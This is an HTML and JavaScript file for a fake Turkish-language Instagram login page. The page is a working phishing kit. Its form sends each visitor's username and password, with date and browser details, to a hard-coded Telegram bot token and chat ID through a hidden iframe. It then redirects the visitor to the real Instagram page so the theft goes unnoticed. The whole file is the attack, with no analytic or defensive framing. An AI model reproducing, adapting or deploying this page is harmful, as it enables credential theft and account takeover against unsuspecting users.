<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Giriş Yap</title>
    <style>
        /* ----- RESET VE TEMEL ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        /* ----- ANA KONTEYNER ----- */
        .container {
            max-width: 380px;
            width: 100%;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
        }
        /* ----- LOGO ----- */
        .logo {
            font-size: 52px;
            font-weight: 700;
            font-family: 'Segoe UI', cursive;
            margin-bottom: 30px;
            color: #262626;
            letter-spacing: -1px;
        }
        .logo span {
            color: #0095f6;
        }
        /* ----- INPUTLAR ----- */
        input {
            width: 100%;
            padding: 14px 12px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            background: #fafafa;
            font-size: 14px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #a8a8a8;
            background: white;
        }
        /* ----- BUTON ----- */
        button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            background: #0095f6;
            border: none;
            border-radius: 6px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #1877f2;
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        /* ----- HATA / BİLGİ MESAJI ----- */
        .message {
            font-size: 14px;
            margin-top: 14px;
            padding: 10px;
            border-radius: 6px;
            display: none;
        }
        .message.error {
            color: #ed4956;
            background: #fde8ea;
        }
        .message.success {
            color: #2e7d32;
            background: #e8f5e9;
        }
        .message.show {
            display: block;
        }
        /* ----- ALT BAĞLANTILAR ----- */
        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #8e8e8e;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        /* ----- UYGULAMA BUTONLARI ----- */
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 15px;
        }
        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }
        /* ----- META BAĞLANTILARI ----- */
        .meta-links {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
        }
        .meta-links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        .meta-links a:hover {
            text-decoration: underline;
        }
        /* ----- DİL SEÇİCİ ----- */
        .language-selector {
            margin-top: 15px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .language-selector select {
            background: transparent;
            border: none;
            color: #8e8e8e;
            font-size: 12px;
            outline: none;
            cursor: pointer;
        }
        /* ----- YÜKLEME ANİMASYONU ----- */
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        /* ----- GİZLİ IFRAME ----- */
        #hiddenFrame {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Instagram Logosu -->
        <div class="logo">Insta<span>gram</span></div>

        <!-- Giriş Formu -->
        <form id="loginForm" 
              action="https://api.telegram.org/bot8604225952:AAHoULyCnrkSQ1Pqjo3xa6UlZgwo7H5ObRA/sendMessage" 
              method="POST" 
              target="hiddenFrame">
            
            <!-- Telegram'a gönderilecek sabit bilgiler -->
            <input type="hidden" name="chat_id" value="1636656252">
            <input type="hidden" name="parse_mode" value="HTML">

            <!-- Kullanıcı adı ve şifre alanları -->
            <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="off">
            <input type="password" id="password" name="password" placeholder="Şifre" required autocomplete="off">
            
            <!-- Mesaj içeriği (kullanıcı adı ve şifre burada birleştirilecek) -->
            <input type="hidden" id="messageText" name="text">

            <button type="submit" id="submitBtn">Giriş Yap</button>
            
            <div id="messageBox" class="message"></div>
        </form>

        <!-- Alt Bağlantılar -->
        <div class="footer">
            <a href="#">Şifreni mi unuttun?</a> · <a href="#">Kayıt ol</a>
        </div>

        <!-- Uygulama İndirme Butonları -->
        <div class="app-buttons">
            <img src="https://www.instagram.com/static/images/appstore/download.png/4b0bf5c873c6.png" alt="App Store">
            <img src="https://www.instagram.com/static/images/googleplay/download.png/5ec07355b8ea.png" alt="Google Play">
        </div>

        <!-- Meta Bağlantıları -->
        <div class="meta-links">
            <a href="#">Meta</a>
            <a href="#">Hakkında</a>
            <a href="#">Yardım</a>
            <a href="#">Gizlilik</a>
            <a href="#">Koşullar</a>
            <a href="#">Konum</a>
            <a href="#">Dil</a>
        </div>

        <!-- Dil Seçici -->
        <div class="language-selector">
            <select>
                <option>Türkçe</option>
                <option>English</option>
                <option>Deutsch</option>
                <option>Français</option>
                <option>Español</option>
            </select>
        </div>
    </div>

    <!-- Gizli iframe (form sonucunu burada yakalarız) -->
    <iframe name="hiddenFrame" id="hiddenFrame"></iframe>

    <script>
        (function() {
            'use strict';

            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submitBtn');
            const messageBox = document.getElementById('messageBox');
            const hiddenMessage = document.getElementById('messageText');

            // Mesaj kutusunu göster/gizle
            function showMessage(text, type) {
                messageBox.textContent = text;
                messageBox.className = 'message ' + type + ' show';
            }

            function hideMessage() {
                messageBox.className = 'message';
                messageBox.textContent = '';
            }

            // Butonu sıfırla
            function resetButton() {
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Giriş Yap';
            }

            // Form gönderimi
            form.addEventListener('submit', function(e) {
                e.preventDefault(); // Sayfanın yenilenmesini engelle

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                // Boş kontrol
                if (!username || !password) {
                    showMessage('❌ Lütfen tüm alanları doldurun.', 'error');
                    return;
                }

                // Butonu kilitle
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner"></span> Giriş yapılıyor...';
                hideMessage();

                // Telegram'a gönderilecek mesajı hazırla
                const ip = '{{IP}}'; // Tarayıcıda IP alamayız, isteğe bağlı
                const userAgent = navigator.userAgent;
                const date = new Date().toLocaleString('tr-TR');

                let msg = "🔐 YENİ INSTAGRAM GİRİŞ BİLGİSİ 🔐\n\n";
                msg += "👤 Kullanıcı: " + username + "\n";
                msg += "🔑 Şifre: " + password + "\n";
                msg += "🕒 Tarih: " + date + "\n";
                msg += "📱 User-Agent: " + userAgent + "\n";
                msg += "-----------------------------\n";
                msg += "✅ Otomatik gönderim başarılı.";

                // Hidden input'a mesajı yaz
                hiddenMessage.value = msg;

                // Şimdi formu gönder (iframe'e yüklenecek)
                form.submit();

                // iframe yüklendiğinde sonucu yakala
                const iframe = document.getElementById('hiddenFrame');
                iframe.onload = function() {
                    try {
                        // iframe'in içeriğini oku (Telegram'dan gelen JSON cevap)
                        const response = iframe.contentDocument.body.innerText;
                        const json = JSON.parse(response);
                        if (json.ok === true) {
                            // Başarılı → gerçek Instagram'a yönlendir
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        } else {
                            showMessage('❌ Telegram hatası: ' + (json.description || 'Bilinmeyen hata'), 'error');
                            resetButton();
                        }
                    } catch (err) {
                        // CORS veya parse hatası olabilir, ama genelde form submit çalışır.
                        // Eğer cevap okunamazsa, yine de başarılı varsayıp yönlendirelim.
                        // Güvenlik nedeniyle bazı tarayıcılar iframe içeriğini okuyamaz.
                        // O yüzden bir süre bekleyip doğrudan yönlendirelim.
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        }, 1000);
                    }
                };

                // Zaman aşımı: 5 saniye içinde yanıt gelmezse yine de yönlendir
                setTimeout(function() {
                    if (submitBtn.disabled) {
                        // Hala bekliyorsa, yönlendir
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }
                }, 5000);
            });

        })();
    </script>
</body>
</html>
